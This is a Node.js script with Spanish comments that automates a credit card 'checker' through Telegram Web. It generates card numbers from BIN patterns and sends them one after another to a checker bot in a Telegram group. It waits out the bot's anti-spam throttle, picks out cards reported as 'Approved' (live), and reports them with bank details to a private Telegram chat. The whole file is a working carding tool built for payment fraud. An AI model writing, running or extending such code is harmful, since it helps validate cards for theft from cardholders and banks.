import express from "express";
import dotenv from "dotenv";
dotenv.config();
import os from "node:os"
import { readFile, writeFile } from 'node:fs/promises';
import path from "path";
import fetch from "node-fetch";
import { parse } from 'node-html-parser';
import { generateCardFromString } from "./GenCard.js";
import { resolve } from 'node:path';
import puppeteer from 'puppeteer-core';
import notifyFoundLiveCard from "./notifyFoundLiveCard.js";
import { resetQueue, getQueue, addCard, deleteFromQueue } from "./modules/queueActions.js"
import { getConfig } from "./modules/getConfig.js";

(async function () {

    // Or import puppeteer from 'puppeteer-core';  

    var countedLive = 0;
    //return console.log(JSON.stringify(binFileContent))
    //var [binsString, gate, group_id, person_chat_id, bot_token, num_to_find, to_wait_card_send, wait_to_begin, max_atemps_per_bin] = binFileContent.split("\r\n").map(e => e.split("=")[1])
    // Carga todas las variables y las parsea
    var env = getConfig();
    console.log(env)
    // Ahora extraemos por nombre en lugar de por índice
    var binsString = env.bin;
    var gate = env.gate;
    var group_id = env.group_id;
    var person_chat_id = env.person_chat_id;
    var bot_token = env.bot_token;
    var num_to_find = env.num_to_find;
    var to_wait_card_send = env.to_wait_card_send;
    var wait_to_begin = env.wait_to_begin;
    var max_atemps_per_bin = env.max_atemps_per_bin;


    if (process.argv[2]) {
        console.log("se recibienron args")
        var splitter = process.argv[2].match(/ +/g)[0];
        [gate, binsString] = process.argv[2].split(splitter);
    }

    var temporalBinIndex = 0;
    var numOfAttempts = 0;
    var binList = [];
    var newBin = false;
    if (binsString.includes(",")) {
        binList = binsString.split(",");
    } else {
        binList = [binsString]
    }
    //var temporalBin = binList[0];

    /* 
    const bin = "43561902140xxxxx|03|2029|rnd";
    var gate = ".ap"; */
    num_to_find = Number(num_to_find);
    max_atemps_per_bin = Number(max_atemps_per_bin);
    to_wait_card_send = Number(to_wait_card_send) * 1000;

    //console.log(person_chat_id)

    const app = express()
    const port = process.env.PORT || 3000;
    var qrSaved = false;
    var logged = false;
    var regexCard = /\d{16,}\|(\d{1}|\d{2})\|(\d{2}|\d{4})\|(\d{3,4})/g;

    var maxCurrent = 2;



    // Launch the browser and open a new blank page
    const browser = await puppeteer.launch({
        args: [

            "--no-sandbox",

        ],
        executablePath: os.platform() === "win32" ? "C:\\Users\\Usuario\\.cache\\puppeteer\\chrome\\win64-119.0.6045.105\\chrome-win64\\chrome.exe" : "/usr/bin/chromium",
        headless: false //!(os.platform() === "win32"),

    });

    /*   const context = await browser.newContext({
        viewport: { width: 375, height: 600 }, // 📱 Tamaño típico de móvil (como iPhone X)
    
      }); */



    /* const defaultBrowserContext = browser.defaultBrowserContext(); */
    /*   const pages = await browser.pages(); */
    //let pages = await browser.pages(); // Seleccionar la primera pestaña (la pestaña que se abre al abrir el navegador)
    let page = await browser.newPage();
    await page.goto('https://web.telegram.org/a/', { timeout: 180_000 });
    await page.waitForSelector("#root", { timeout: 180_000 });

    var localStorageBuffer = await readFile(resolve("./localStorage.json"))
    var localStorageJSON = localStorageBuffer.toString();
    if (localStorageJSON !== "") {


        var localStorageObject = JSON.parse(localStorageJSON);

        await page.evaluate((localStorageJSON) => {
            Object.keys(localStorageJSON).forEach(key => {
                window.localStorage.setItem(key, localStorageJSON[key]);
            });
        }, localStorageObject);
    }

    await page.evaluate(() => window.stop());

    await waitForTimeout(2000)

    // Navigate the page to a URL.
    /* await page.goto('https://web.telegram.org/a/' + group_id); */
    /* page.evaluate(() => window.location.reload()); */
    await page.reload();
    await page.waitForSelector("#LeftColumn-main > div.Transition > div > div > div > div > div > div", { timeout: 180_000 })

    await waitForTimeout(13_000)
    await page.evaluate(() => {
        Array.from(document.querySelectorAll("#LeftColumn-main > div.Transition > div > div > div > div > div > div")).find(e => e.innerText.includes("𝙇𝙞𝙤𝙣𝙨 𝘾𝙝𝙚𝙘𝙠𝙚𝙧")).id = "este-es-el-checker"
        return true
    })

    await page.locator("#este-es-el-checker").click();
    //await page.goto('https://web.telegram.org/a/' + group_id,{timeout:180_000});



    var ultimaVezEnviadaUnaTarjeta = null;
    // Set screen size.

    /**
 * Detecta mensaje anti‑spam hasta que expire el timeout.
 *
 * @param {number} timeoutMs Tiempo máximo en milisegundos para esperar el anti‑bot. Por defecto 2000 ms.
 * @returns {Promise<{ anti: boolean, seconds: number }>}
 */
function antibot(timeoutMs = 2000) {
    const startTime = Date.now();
  
    return new Promise(async resolve => {
      // Sigue intentando hasta que se cumpla el timeout
      while (Date.now() - startTime <= timeoutMs) {
        const antibotResponse = await page.evaluate(() => {
          const messages = document.querySelectorAll(
            ".message-date-group.first-message-date-group > div"
          );
          const last = messages[messages.length - 1];
          const txtNode = last?.querySelector(
            "div div.text-content.clearfix.with-meta"
          );
          if (
            txtNode?.innerText.includes(
              "‍[𝑨𝑵𝑻𝑰𝑺𝑷𝑨𝑴] 𝑻𝒓𝒚 𝒂𝒈𝒂𝒊𝒏 𝒂𝒇𝒕𝒆𝒓 "
            )
          ) {
            return {
              anti: true,
              milliseconds:1000* parseInt(txtNode.innerText.match(/\d+'/)[0], 10)
            };
          }
          return { anti: false, milliseconds: 0 };
        });
  
        if (antibotResponse.anti) {
          // Resuelve y sale inmediatamente
          return resolve(antibotResponse);
        }
        // opcional: pequeña pausa para no saturar CPU
        await new Promise(r => setTimeout(r, 200));
      }
  
      // timeout expirado sin detectar anti‑bot
      resolve({ anti: false, milliseconds: 0 });
    });
  }
  

    /* MANEJAR TARJETAS */

    /*
    await page.evaluate((chat_id) => {
      Array.from(document.querySelectorAll("a")).find(a=>a.href=chat_id)
      return true
    }, chat_id)
    */
    resetQueue();
    var ejecucion = 1;
    var yaCargo = false;
    async function interval() {
        //console.log("interval ejecuando")
        if (newBin) {
            countedLive = 0;
            numOfAttempts = 0;
            temporalBinIndex = temporalBinIndex + 1;
            newBin = false;
            console.log("Cambiando a nuevo bin: " + binList[temporalBinIndex])
        }

        /* if (!yaCargo) {
          page.waitForSelector('#editable-message-text', { timeout: 60_000 })
          yaCargo=true;
        } */
        //console.log(ejecucion++);
        var startTime = Date.now();
        const maxTime = 4000; // límite inferior para el tiempo transcurrido




        /*     var checkingCards=await getCheckingCards();
            //console.log("checking cards: ",checkingCards) */
        /* if (yaCargo) { */
        var cardsStatuses = await getCardsStatuses();


        for (let i = cardsStatuses.length - 1; i >= 0; i--) {
            var queue = getQueue();
            if (queue.length < 1) break;
            //console.log(i+1)


            var cardObj = cardsStatuses[i];
            var card = cardObj.card.toString().trim();
            var index = queue.indexOf(card);


            if (cardObj.live && index >= 0) {


                console.log("se encontro live: ", JSON.stringify(cardObj))
                /* var fileContent = await readFile(resolve("./lives.json"))
                var liveCards = JSON.parse(fileContent);
                if (!liveCards.find(e => e.card === cardObj.card)) {
                  liveCards.push(cardObj);
                  await writeFile(resolve("./lives.json"), JSON.stringify(liveCards))
                } */
                await notificartelegramTarjetaLive(cardObj)

                //DETENER CUANDO SE ALCANCE EL LIMITE
                countedLive = countedLive + 1;
                if (num_to_find === countedLive) {
                    try {
                        console.log("SE ALCANZO EL NUMERO DE LIVE ESPECIFICADAS EN ENV.TXT")
                        if (num_to_find === countedLive) {

                            if (temporalBinIndex === binList.length - 1) {
                                await browser.close();
                            } {
                                newBin = true;

                            }


                        }
                    } catch (error) {
                        console.error("Error al cerrar el navegador:", error);
                    }
                }
            }

            if (index >= 0) {
                numOfAttempts = numOfAttempts + 1;
                console.log("Intento: " + numOfAttempts + ", Borrando:", cardObj.card, ",index " + queue.indexOf(cardObj.card))
                deleteFromQueue(card)
                if (numOfAttempts === max_atemps_per_bin) {
                    newBin = true;
                }
                //console.log(cardsStatuses[i])
            }
        }



        var cupos = maxCurrent - getQueue().length;

        while (cupos > 0) {
            //console.log("cupos: ", cupos)
            var cardString = generateCardFromString(binList[temporalBinIndex]);
            //console.log(cardString)
            var cmmd = `${gate} ${cardString}`;
            if (cardString) {


                await sendCardToCheck(cmmd);
                var timeoutAntibot=2000;
                var resAntibot= await antibot(timeoutAntibot);
                if (resAntibot.anti) {
                    console.log("Antibot esperando "+(resAntibot.milliseconds-timeoutAntibot)+" ms");
                    await waitForTimeout(resAntibot.milliseconds-timeoutAntibot);
                    await sendCardToCheck(cmmd);
                };
                addCard(cardString);
                cupos--;
            }
            /*  } */

        }

        const endTime = Date.now();
        const timeElapsed = endTime - startTime;

        if (timeElapsed >= maxTime) {
            // llamar a la función interval de manera recursiva
            interval();
        } else {
            // establecer un intervalo de tiempo fijo antes de llamar a la función interval de manera recursiva
            setTimeout(interval, maxTime - timeElapsed);
        }


    }




    setTimeout(async () => {
        /* var buttonpage = await page.evaluate(()=>{
          if(document.querySelector("#portals > div:nth-child(2) > div > div > div.modal-dialog > div.modal-content.custom-scroll > div > button")){
            return true;
          }
      
          return false
        })
      
        if(buttonpage){
          var button = await page.waitForSelector("#portals > div:nth-child(2) > div > div > div.modal-dialog > div.modal-content.custom-scroll > div > button");
          await button.click();
        }
        await new Promise((resolve)=>{
          setTimeout(resolve, 10_000)
        }) */

        interval();
    }, (Number(wait_to_begin) * 1000));



    /*  async function checkIfAntispamTimer() {
       var toWait = await page.evaluate(() => {
         
         var messages = Array.from(document.querySelectorAll(".messages-container div.text-content.clearfix.with-meta"));
         var lastMessageContent = messages[messages.length - 1].innerText;
         var thematch = lastMessageContent.match(/\d+'s/)
         if (lastMessageContent.includes("ANTISPAM Timer, Try Again After") && thematch !== null) {
           return ((Number(thematch[0].slice(0, -2)) + 0.5) * 1000)
         }
         return 0
   
       })
       
       return toWait
   
     } */


    async function getCardsStatuses() {



        var cardsStatuses = await page.evaluate(() => {
            function generateDate() {
                var dateOb = new Date();
                return dateOb.toLocaleString("es-CO", { timeZone: "America/Bogota" });
            }
            /* */
            var allMessages = Array.from(document.querySelectorAll(".messages-container div.text-content.clearfix.with-meta"));
            //console.log(allMessages.map(e=>e.innerText))
            var regexCard = /\d{16,}\|(\d{1}|\d{2})\|(\d{2}|\d{4})\|(\d{3,4})/g;

            var matches = allMessages.filter(e => e.innerText.match(regexCard) !== null && e.innerText.includes("[𒈒] 𝑪𝑪 ➵ ")).filter(e => e.innerText.includes(" 𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆 ➵ ") && e.innerText.includes("[𒈒] 𝑺𝒕𝒂𝒕𝒖𝒔 ➵ ")).map(ele => {
                //console.log(ele.innerText)
                /* var preMessage = ""
                //ERROR INTERNO DEL CHECKER
                if(ele.querySelector("img[alt=⚠️]")) {
                  //console.log("este tiene error")
                  preMessage="ERROR ⚠️";
                } */
                var cardState = {
                    message: /* preMessage ||  */ele.innerText.match(/ 𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆 ➵ ([^\n]*)/)[0].split(" 𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆 ➵ ")[1],
                    live: ele.innerText.includes("[𒈒] 𝑺𝒕𝒂𝒕𝒖𝒔 ➵ Approved") ? true : false,
                    cardInfo: ele.innerText.includes("\[𒈒\] 𝑰𝒏𝒇𝒐 ➵ ") ? ele.innerText.match(/\[𒈒\] 𝑰𝒏𝒇𝒐 ➵ ([^\n]*)/)[0].split("[𒈒] 𝑰𝒏𝒇𝒐 ➵ ")[1] : "No Info",
                    bankName: ele.innerText.includes("\[𒈒\] 𝑩𝒂𝒏𝒌 ➵ ") ? ele.innerText.match(/\[𒈒\] 𝑩𝒂𝒏𝒌 ➵ ([^\n]*)/)[0].split("[𒈒] 𝑩𝒂𝒏𝒌 ➵ ")[1] : "No Info",
                    card: ele.innerText.match(regexCard)[0],
                    date: generateDate()
                }
                // console.log(s)
                return cardState;


            })
            //return matches
            return matches.slice(-4);


        })
        // console.log(cardsStatuses)
        return cardsStatuses


    }
    async function sendCardToCheck(cmmd) {
        return new Promise(async r => {

            await page.type('#editable-message-text', cmmd, { delay: 3 })

            await new Promise(r => { setTimeout(() => { r(true) }, generateRandomNumber(456, 1000)) })
            await page.click("#MiddleColumn > div.messages-layout > div.Transition > div > div.middle-column-footer > div.Composer.shown.mounted > button");
            await new Promise(r => { setTimeout(() => { r(true) }, generateRandomNumber(456, 1000)) })
            r(true)
        })


    }



    // Escuchar eventos de respuesta de HTTP
    page.on('requestfinished', (request) => {
        if (request.url().startsWith('https://web.telegram.org/a/blank') && logged == false) {
            //console.log(request.url())
            if (
                localStorageJSON === ""
            ) { updateQr() }

        }
        if (request.url().startsWith('https://web.telegram.org/a/BundleMain.') && request.url().endsWith('.css')) {
            //console.log(request.url())
            //console.log('Sesión iniciada')
            if (localStorageJSON === "") {
                page.waitForSelector("#LeftColumn-main > div.NewChatButton > button")
                    .then(() => {
                        page.evaluate(() => {
                            return JSON.stringify(window.localStorage);
                        })
                            .then((localStorageJSON) => {
                                /* fs.writeFileSync('localStorage.json', localStorageJSON);
                                //console.log("localStorage.json was saved") */

                                uploadLocalStorageFile(localStorageJSON)
                                    .then(() => console.log("localStorage file uploaded"))
                                    .catch(error => console.log(error))

                            })
                    })
                    .catch(error => console.log(error))
            }
            logged = true;
        }
    });



    app.get('/qr', (req, res) => {
        if (logged) {
            res.send('Sesión iniciada')
        }
        else if (!qrSaved) {
            res.send('qr not saved yet');
        }
        else {
            res.sendFile(path.resolve('./qr.png'));
        }

    })

    app.listen(port, () => {
        //console.log(`Example app listening on port ${port}`)
    })



    async function updateQr() {
        var qrSelector = await page.waitForSelector(".qr-container");
        qrSelector.screenshot().then(buffer => {
            fs.writeFileSync('qr.png', buffer);
            //console.log("QR code screenshot saved to qr.png");
            qrSaved = true;
        })
            .catch(error => console.log(error))
    }


    async function notificartelegramTarjetaLive(liveCardObj) {
        var message = "";
        message += "Live Card ✅\n\n";
        message += "*Card:* `" + liveCardObj.card + "`\n";
        message += "*Card Info:* `" + liveCardObj.cardInfo + "`\n";
        message += "*Bank Name:* `" + liveCardObj.bankName + "`\n";
        message += "*Message:* `" + liveCardObj.message + "`\n";
        message += "*Date:* `" + liveCardObj.date + "`\n";
        message += "*Bin:* `" + binList[temporalBinIndex] + "`\n";
        message += "*Gate:* `" + gate + "`";
        var apiEndpoint = "https://api.telegram.org/bot";

        try {

            var options =

            {

                'headers': { "Content-Type": "application/json" },

                'method': "POST",

                'body': JSON.stringify({

                    "method": "sendMessage",

                    "chat_id": person_chat_id,

                    "text": message,
                    "parse_mode": "Markdown"

                })

            };

            var response = await fetch(apiEndpoint + bot_token + "/", options);
            var responseMessage = await response.json();
            if (responseMessage.ok) {
                console.log("Se envio la live " + liveCardObj.card + " a el telegram");
                notifyFoundLiveCard(liveCardObj.card);
            } else {

                throw new Error(responseMessage.description);

            }
            /*  await responseMessage({chat_id: person_chat_id, message_id: responseMessage.message_id, message})
          */


            //var json = JSON.parse(response.getContentText());

        } catch (err) {
            console.log("Error para enviar mensaje a persona:")
            console.log(err)
        }
    }

})()

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}



function waitForTimeout(time) {
    return new Promise((r) => setTimeout(r, time))
}